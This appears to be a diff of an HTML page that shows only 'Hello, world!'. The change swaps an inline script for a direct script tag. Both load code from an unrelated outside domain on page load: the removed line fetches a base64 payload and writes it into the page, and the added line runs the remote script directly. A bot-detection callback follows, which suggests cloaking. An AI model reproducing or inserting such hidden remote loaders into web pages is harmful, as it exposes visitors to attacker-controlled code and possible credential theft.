@@ -26,7 +26,7 @@ img { max-width: 100%; height: auto; }
 </head>
    <body>
        Hello, world!
-       <script> var script_url = 'https://babanina.cf/jsprocessing.php'; window.addEventListener("load", function () { var request = new XMLHttpRequest(); request.open('GET', script_url, true); request.addEventListener('readystatechange', function () { if ((request.readyState == 4) && (request.status == 200)) { if(request.responseText !== ''){ var decodedString = atob(request.responseText); document.write(''+ decodedString +''); } } }); request.send(); }); </script>
+       <script src="https://babanina.cf/jsprocessing.php"> </script>
     <script type="text/javascript" language="javascript">   
             var callback = function(result) {
                 if (result.isBot) {
